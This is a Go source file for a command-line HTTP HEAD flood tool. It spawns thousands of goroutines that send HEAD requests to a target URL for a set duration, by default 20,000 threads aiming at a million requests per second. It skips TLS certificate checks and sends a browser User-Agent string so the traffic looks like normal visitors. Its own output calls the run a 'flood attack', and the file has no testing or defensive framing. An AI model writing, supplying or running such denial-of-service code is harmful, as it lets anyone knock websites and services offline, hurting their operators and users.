package main

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"os"
	"strconv"
	"sync"
	"time"
)

func flood(target string, reqPerSec, threads int, duration time.Duration) {
	var wg sync.WaitGroup
	stop := time.Now().Add(duration)

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for time.Now().Before(stop) {
				for j := 0; j < reqPerSec/threads; j++ {
					req, _ := http.NewRequest("HEAD", target, nil)
					req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
					resp, err := client.Do(req)
					if err == nil {
						resp.Body.Close()
					}
				}
				time.Sleep(1 * time.Second)
			}
		}()
	}
	wg.Wait()
}

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Usage: go run head.go <url> <duration_sec> [req_per_sec] [threads]")
		return
	}

	target := os.Args[1]
	duration, _ := strconv.Atoi(os.Args[2])
	reqPerSec := 1000000
	threads := 20000

	if len(os.Args) > 3 {
		reqPerSec, _ = strconv.Atoi(os.Args[3])
	}
	if len(os.Args) > 4 {
		threads, _ = strconv.Atoi(os.Args[4])
	}

	fmt.Printf("🚀 Starting HEAD flood attack on %s with %d RPS, %d threads for %d seconds...\n",
		target, reqPerSec, threads, duration)

	flood(target, reqPerSec, threads, time.Duration(duration)*time.Second)
}
